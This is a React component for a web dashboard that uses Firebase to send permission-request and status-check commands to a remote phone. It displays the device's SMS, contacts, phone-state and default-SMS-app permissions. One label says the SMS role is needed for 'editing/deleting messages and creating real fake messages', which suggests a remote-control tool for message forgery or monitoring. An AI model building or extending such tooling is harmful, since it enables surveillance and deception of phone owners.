import { useEffect, useState, useMemo } from 'react'
import { onValue, off, get, set } from 'firebase/database'
import { getDevicePermissionsPath, getDevicePermissionStatusPath, getDeviceCommandsPath } from '@/lib/firebase-helpers'
import type { DevicePermission } from '@/lib/firebase-helpers'
import {
  transformPermissionsToInfo,
  getPermissionSummary,
  type PermissionInfo,
} from '@/lib/permission-helpers'
import PermissionCard from './PermissionCard'
import { Button } from '@/component/ui/button'
import { Skeleton } from '@/component/ui/skeleton'
import { Shield, RefreshCw, AlertCircle, CheckCircle2, Clock, Smartphone } from 'lucide-react'
import { useToast } from '@/lib/use-toast'
import { retryWithBackoff, isRetryableError } from '@/lib/retry-utils'
import { formatDistanceToNow } from 'date-fns'

interface PermissionManagerProps {
  deviceId: string | null
  onPermissionInfoChange?: (permissions: PermissionInfo[]) => void
  filterMode?: 'all' | 'granted' | 'denied'
}

export default function PermissionManager({
  deviceId,
  onPermissionInfoChange,
  filterMode = 'all',
}: PermissionManagerProps) {
  const { toast } = useToast()
  const [permissions, setPermissions] = useState<DevicePermission | null>(null)
  const [permissionInfo, setPermissionInfo] = useState<PermissionInfo[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [lastUpdated, setLastUpdated] = useState<number | null>(null)
  const [requestingPermissions, setRequestingPermissions] = useState(false)
  const [selectedPermissions, setSelectedPermissions] = useState<Set<string>>(new Set())
  const [showSelectionMode, setShowSelectionMode] = useState(false)
  const [defaultSmsAppStatus, setDefaultSmsAppStatus] = useState<{ isDefault: boolean; currentPackage?: string } | null>(null)

  // Fetch permissions from Firebase
  useEffect(() => {
    if (!deviceId) {
      setPermissions(null)
      setPermissionInfo([])
      setLoading(false)
      setError(null)
      return
    }

    let isMounted = true
    let unsubscribe: (() => void) | null = null

    const permissionsRef = getDevicePermissionsPath(deviceId)

    // Fast initial load using get() with retry
    const loadInitialPermissions = async () => {
      try {
        setLoading(true)
        setError(null)

        const snapshot = await retryWithBackoff(() => get(permissionsRef), {
          maxAttempts: 3,
          initialDelay: 300,
          retryable: isRetryableError,
        })

        if (!isMounted) return

        if (!snapshot.exists()) {
          setPermissions(null)
          setPermissionInfo([])
          setLastUpdated(null)
          setLoading(false)
          return
        }

        const data = snapshot.val() as DevicePermission
        setPermissions(data)
        setLastUpdated(Date.now())
        setLoading(false)
      } catch (err) {
        if (!isMounted) return
        console.error('Error loading permissions:', err)
        const errorMessage = err instanceof Error ? err.message : 'Failed to load permissions'
        setError(errorMessage)
        setLoading(false)
        toast({
          title: 'Error loading permissions',
          description: errorMessage,
          variant: 'destructive',
        })
      }
    }

    // Set up real-time listener
    const setupRealtimeListener = () => {
      unsubscribe = onValue(
        permissionsRef,
        snapshot => {
          if (!isMounted) return

          try {
            if (!snapshot.exists()) {
              setPermissions(null)
              setPermissionInfo([])
              setLastUpdated(null)
              return
            }

            const data = snapshot.val() as DevicePermission
            setPermissions(data)
            setLastUpdated(Date.now())
            setError(null)
          } catch (err) {
            console.error('Error processing permissions:', err)
            const errorMessage =
              err instanceof Error ? err.message : 'Failed to process permissions'
            setError(errorMessage)
            toast({
              title: 'Error processing permissions',
              description: errorMessage,
              variant: 'destructive',
            })
          }
        },
        error => {
          if (!isMounted) return
          console.error('Error listening to permissions:', error)
          const errorMessage = error.message || 'Failed to fetch permissions'
          setError(errorMessage)
          toast({
            title: 'Connection error',
            description: errorMessage,
            variant: 'destructive',
          })
        }
      )
    }

    // Load initial data first
    loadInitialPermissions()

    // Set up real-time listener after a short delay
    const listenerTimeout = setTimeout(setupRealtimeListener, 100)

    return () => {
      isMounted = false
      clearTimeout(listenerTimeout)
      if (unsubscribe) {
        unsubscribe()
      } else {
        off(permissionsRef)
      }
    }
  }, [deviceId, toast])

  // Fetch default SMS app status from permissionStatus
  useEffect(() => {
    if (!deviceId) {
      setDefaultSmsAppStatus(null)
      return
    }

    const permissionStatusRef = getDevicePermissionStatusPath(deviceId)
    
    // Get the latest permission status
    const unsubscribe = onValue(
      permissionStatusRef,
      (snapshot) => {
        if (!snapshot.exists()) {
          setDefaultSmsAppStatus(null)
          return
        }

        // Get the latest timestamp entry
        const entries: Array<{ timestamp: number; data: any }> = []
        snapshot.forEach((child) => {
          entries.push({
            timestamp: parseInt(child.key || '0'),
            data: child.val(),
          })
          return false
        })

        if (entries.length === 0) {
          setDefaultSmsAppStatus(null)
          return
        }

        // Sort by timestamp descending and get the latest
        entries.sort((a, b) => b.timestamp - a.timestamp)
        const latest = entries[0].data

        if (latest.defaultSmsApp) {
          setDefaultSmsAppStatus({
            isDefault: latest.defaultSmsApp.isDefault === true,
            currentPackage: latest.defaultSmsApp.currentDefaultPackage || latest.defaultSmsApp.packageName,
          })
        } else {
          setDefaultSmsAppStatus(null)
        }
      },
      (error) => {
        console.error('Error listening to permission status:', error)
      }
    )

    return () => {
      off(permissionStatusRef, 'value', unsubscribe)
    }
  }, [deviceId])

  // Transform permissions to PermissionInfo array when permissions change
  useEffect(() => {
    const info = transformPermissionsToInfo(permissions)
    
    // Add default SMS app status if available
    if (defaultSmsAppStatus !== null) {
      const defaultSmsAppInfo: PermissionInfo = {
        type: 'defaultSmsApp',
        name: 'Default SMS App',
        description: 'Required for editing/deleting messages and creating real fake messages',
        icon: Smartphone,
        isGranted: defaultSmsAppStatus.isDefault,
      }
      
      // Check if it already exists in info array, if not add it
      const exists = info.find(p => p.type === 'defaultSmsApp')
      if (!exists) {
        info.push(defaultSmsAppInfo)
      } else {
        // Update existing entry
        const index = info.findIndex(p => p.type === 'defaultSmsApp')
        if (index >= 0) {
          info[index] = defaultSmsAppInfo
        }
      }
    }
    
    setPermissionInfo(info)
    onPermissionInfoChange?.(info)
  }, [permissions, defaultSmsAppStatus, onPermissionInfoChange])

  // Filter permissions based on filterMode
  const filteredPermissionInfo = useMemo(() => {
    if (filterMode === 'granted') {
      return permissionInfo.filter(p => p.isGranted)
    } else if (filterMode === 'denied') {
      return permissionInfo.filter(p => !p.isGranted)
    }
    return permissionInfo
  }, [permissionInfo, filterMode])

  // Handle request all permissions
  const handleRequestAllPermissions = async () => {
    if (!deviceId) return

    try {
      setRequestingPermissions(true)

      // Send requestPermission command to Firebase
      const commandRef = getDeviceCommandsPath(deviceId, 'requestPermission')
      await set(commandRef, 'ALL')

      toast({
        title: 'Permission request sent',
        description: 'Requesting all permissions from device...',
        variant: 'default',
      })

      // Command will be removed by device when processed
      // No need to manually clear it
    } catch (err) {
      console.error('Error requesting permissions:', err)
      const errorMessage = err instanceof Error ? err.message : 'Failed to request permissions'
      toast({
        title: 'Error requesting permissions',
        description: errorMessage,
        variant: 'destructive',
      })
    } finally {
      setRequestingPermissions(false)
    }
  }

  // Handle request selected permissions
  const handleRequestSelectedPermissions = async () => {
    if (!deviceId || selectedPermissions.size === 0) return

    try {
      setRequestingPermissions(true)

      // Convert selected permission types to Android format
      const permissionMap: Record<string, string> = {
        sms: 'sms',
        contacts: 'contacts',
        phone_state: 'phone_state',
        notification: 'notification',
        battery: 'battery',
        defaultSmsApp: 'defaultSmsApp', // Will trigger requestDefaultSmsApp command
      }

      // Build comma-separated list of selected permissions
      const permissionsToRequest = Array.from(selectedPermissions)
        .map(type => permissionMap[type])
        .filter(Boolean)
        .join(',')

      // Send requestPermission command to Firebase
      const commandRef = getDeviceCommandsPath(deviceId, 'requestPermission')
      await set(commandRef, permissionsToRequest)

      toast({
        title: 'Permission request sent',
        description: `Requesting ${selectedPermissions.size} selected permission(s) from device...`,
        variant: 'default',
      })

      // Clear selection after sending
      setSelectedPermissions(new Set())
      setShowSelectionMode(false)

      // Command will be removed by device when processed
    } catch (err) {
      console.error('Error requesting permissions:', err)
      const errorMessage = err instanceof Error ? err.message : 'Failed to request permissions'
      toast({
        title: 'Error requesting permissions',
        description: errorMessage,
        variant: 'destructive',
      })
    } finally {
      setRequestingPermissions(false)
    }
  }

  // Handle permission selection
  const handlePermissionSelection = (permissionType: string, selected: boolean) => {
    const newSelection = new Set(selectedPermissions)
    if (selected) {
      newSelection.add(permissionType)
    } else {
      newSelection.delete(permissionType)
    }
    setSelectedPermissions(newSelection)
  }

  // Select all denied permissions
  const handleSelectAllDenied = () => {
    const deniedPermissions = filteredPermissionInfo
      .filter(p => !p.isGranted)
      .map(p => p.type)
    setSelectedPermissions(new Set(deniedPermissions))
  }

  // Clear all selections
  const handleClearSelection = () => {
    setSelectedPermissions(new Set())
  }

  // Handle refresh - sends checkPermission command to device
  const handleRefresh = async () => {
    if (!deviceId) return

    try {
      setLoading(true)
      setError(null)

      // Send checkPermission command to Firebase to trigger device permission check
      const commandRef = getDeviceCommandsPath(deviceId, 'checkPermission')
      await set(commandRef, 'status')

      toast({
        title: 'Checking permissions',
        description: 'Requesting latest permission status from device...',
        variant: 'default',
      })

      // Wait a bit for the device to process and upload the status
      // Then refresh the permissions data from Firebase
      setTimeout(async () => {
        try {
          const permissionsRef = getDevicePermissionsPath(deviceId)
          const snapshot = await retryWithBackoff(() => get(permissionsRef), {
            maxAttempts: 3,
            initialDelay: 300,
            retryable: isRetryableError,
          })

          if (!snapshot.exists()) {
            setPermissions(null)
            setPermissionInfo([])
            setLastUpdated(null)
            setLoading(false)
            return
          }

          const data = snapshot.val() as DevicePermission
          setPermissions(data)
          setLastUpdated(Date.now())
          setLoading(false)

          toast({
            title: 'Permissions refreshed',
            description: 'Permission status has been updated',
            variant: 'default',
          })
        } catch (err) {
          console.error('Error loading updated permissions:', err)
          const errorMessage = err instanceof Error ? err.message : 'Failed to load updated permissions'
          setError(errorMessage)
          setLoading(false)
          toast({
            title: 'Error loading permissions',
            description: errorMessage,
            variant: 'destructive',
          })
        }
      }, 2000) // Wait 2 seconds for device to process command and upload status
    } catch (err) {
      console.error('Error sending checkPermission command:', err)
      const errorMessage = err instanceof Error ? err.message : 'Failed to check permissions'
      setError(errorMessage)
      setLoading(false)
      toast({
        title: 'Error checking permissions',
        description: errorMessage,
        variant: 'destructive',
      })
    }
  }

  const summary = getPermissionSummary(permissions)

  return (
    <div className="space-y-6">
      {/* Header - Only show if not inside tabs */}
      {filterMode === 'all' && (
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-2xl font-bold flex items-center gap-2">
              <Shield className="h-6 w-6" />
              Permissions
            </h2>
            <p className="text-sm text-muted-foreground mt-1">View and manage device permissions</p>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={handleRefresh}
              disabled={loading || !deviceId}
            >
              <RefreshCw className={`h-4 w-4 ${loading ? 'animate-spin' : ''}`} />
              Refresh
            </Button>
          </div>
        </div>
      )}

      {/* Summary */}
      {permissions && (
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="p-4 rounded-lg border bg-card">
            <div className="flex items-center gap-2">
              <CheckCircle2 className="h-5 w-5 text-green-600" />
              <div>
                <p className="text-sm text-muted-foreground">Granted</p>
                <p className="text-2xl font-bold">{summary.granted}</p>
              </div>
            </div>
          </div>
          <div className="p-4 rounded-lg border bg-card">
            <div className="flex items-center gap-2">
              <AlertCircle className="h-5 w-5 text-red-600" />
              <div>
                <p className="text-sm text-muted-foreground">Denied</p>
                <p className="text-2xl font-bold">{summary.denied}</p>
              </div>
            </div>
          </div>
          <div className="p-4 rounded-lg border bg-card">
            <div className="flex items-center gap-2">
              <Shield className="h-5 w-5 text-blue-600" />
              <div>
                <p className="text-sm text-muted-foreground">Total</p>
                <p className="text-2xl font-bold">{summary.total}</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Last Updated */}
      {lastUpdated && (
        <div className="flex items-center gap-2 text-sm text-muted-foreground">
          <Clock className="h-4 w-4" />
          <span>
            Last updated: {formatDistanceToNow(new Date(lastUpdated), { addSuffix: true })}
          </span>
        </div>
      )}

      {/* Error State */}
      {error && (
        <div className="p-4 rounded-lg border border-red-200 bg-red-50 dark:bg-red-900/20">
          <div className="flex items-center gap-2 text-red-600">
            <AlertCircle className="h-5 w-5" />
            <div>
              <p className="font-semibold">Error loading permissions</p>
              <p className="text-sm">{error}</p>
            </div>
          </div>
          <Button variant="outline" size="sm" onClick={handleRefresh} className="mt-2">
            Retry
          </Button>
        </div>
      )}

      {/* Loading State */}
      {loading && permissionInfo.length === 0 && (
        <div className="space-y-3">
          {[...Array(5)].map((_, i) => (
            <div key={i} className="p-4 border rounded-lg">
              <div className="flex items-start gap-3">
                <Skeleton className="h-10 w-10 rounded-lg" />
                <div className="flex-1 space-y-2">
                  <Skeleton className="h-4 w-32" />
                  <Skeleton className="h-3 w-48" />
                  <Skeleton className="h-6 w-20" />
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Empty State */}
      {!loading && !error && filteredPermissionInfo.length === 0 && (
        <div className="p-8 text-center text-muted-foreground">
          <Shield className="h-12 w-12 mx-auto mb-4 opacity-50" />
          <p className="font-medium">No permissions data available</p>
          <p className="text-sm mt-2">Permissions will appear here when device reports status</p>
          <Button
            variant="outline"
            size="sm"
            onClick={handleRequestAllPermissions}
            disabled={requestingPermissions || !deviceId}
            className="mt-4"
          >
            {requestingPermissions ? (
              <>
                <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                Requesting...
              </>
            ) : (
              <>
                <Shield className="h-4 w-4 mr-2" />
                Request All Permissions
              </>
            )}
          </Button>
        </div>
      )}

      {/* Permissions List */}
      {!loading && permissionInfo.length > 0 && (
        <div className="space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <h3 className="font-semibold">Permission Status</h3>
            <div className="flex items-center gap-2">
              {showSelectionMode ? (
                <>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={handleSelectAllDenied}
                    disabled={requestingPermissions || !deviceId}
                  >
                    Select All Denied
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={handleClearSelection}
                    disabled={requestingPermissions || selectedPermissions.size === 0}
                  >
                    Clear
                  </Button>
                  <Button
                    variant="default"
                    size="sm"
                    onClick={handleRequestSelectedPermissions}
                    disabled={requestingPermissions || !deviceId || selectedPermissions.size === 0}
                  >
                    {requestingPermissions ? (
                      <>
                        <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                        Requesting...
                      </>
                    ) : (
                      <>
                        <Shield className="h-4 w-4 mr-2" />
                        Request Selected ({selectedPermissions.size})
                      </>
                    )}
                  </Button>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => {
                      setShowSelectionMode(false)
                      setSelectedPermissions(new Set())
                    }}
                  >
                    Cancel
                  </Button>
                </>
              ) : (
                <>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowSelectionMode(true)}
                    disabled={requestingPermissions || !deviceId}
                  >
                    Select Permissions
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={handleRequestAllPermissions}
                    disabled={requestingPermissions || !deviceId}
                  >
                    {requestingPermissions ? (
                      <>
                        <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                        Requesting...
                      </>
                    ) : (
                      <>
                        <Shield className="h-4 w-4 mr-2" />
                        Request All Permissions
                      </>
                    )}
                  </Button>
                </>
              )}
            </div>
          </div>
          {showSelectionMode && selectedPermissions.size > 0 && (
            <div className="p-3 bg-primary/10 border border-primary/20 rounded-lg">
              <p className="text-sm text-primary">
                {selectedPermissions.size} permission(s) selected
              </p>
            </div>
          )}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filteredPermissionInfo.map(permission => (
              <PermissionCard
                key={permission.type}
                permission={permission}
                isSelected={selectedPermissions.has(permission.type)}
                onSelectionChange={(selected) => handlePermissionSelection(permission.type, selected)}
                showCheckbox={showSelectionMode}
              />
            ))}
          </div>
        </div>
      )}
    </div>
  )
}
